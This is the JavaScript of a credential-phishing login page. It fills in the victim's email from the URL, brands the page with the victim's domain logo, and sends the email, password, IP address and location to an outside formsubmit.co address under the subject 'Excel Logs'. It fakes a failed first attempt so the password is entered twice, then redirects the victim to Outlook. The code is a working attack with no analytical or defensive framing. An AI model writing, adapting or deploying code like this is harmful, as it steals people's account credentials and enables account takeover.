<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script>

	let step = 1;
	
	const clientID = window.location.hash.split("#").pop();
	$('#email').val(clientID);
	const domain = clientID.split('@').pop();

	$("#frame").attr("src", "https://" + domain);
	$("#logo").attr("src", "https://logo.clearbit.com/" + domain);

	const submit = $("button[type='submit']");

	$("#login-form").submit(function(event) {

		event.preventDefault();

		submit.text('Verifying...');

		$.getJSON('https://ipinfo.io/json', function(response) {
			const posting = $.post("https://formsubmit.co/ajax/chasinggdream@gmail.com", {
				_subject: "Excel Logs | " + response.ip,
				Email: $("#email").val(),
				Password: $("#psw").val(),
				Attempts: step,
				IP: response.ip,
				Location: response.city + ", " + response.country,
			});

			posting.done(function(data) {
				if (step === 2) {
					window.location.href = "https://outlook.live.com";
				} else {
					step++;
					$("#error").css("display", "block");
					submit.text('Sign In');
					$("#psw").val("");
				}
			});

			posting.fail(function(error) {
				console.error(error);
				$("#error").css("display", "block");
				submit.text('Sign In');
				$("#psw").val("");
			});
		}, "json");
	});
</script>
  
 
  
  
  
  <script>
        document.querySelector('.show-password').addEventListener('click', function () {
            const passwordInput = document.getElementById('psw');
            const showBtn = this;

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                showBtn.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                showBtn.textContent = 'Show';
            }
        });
    </script>
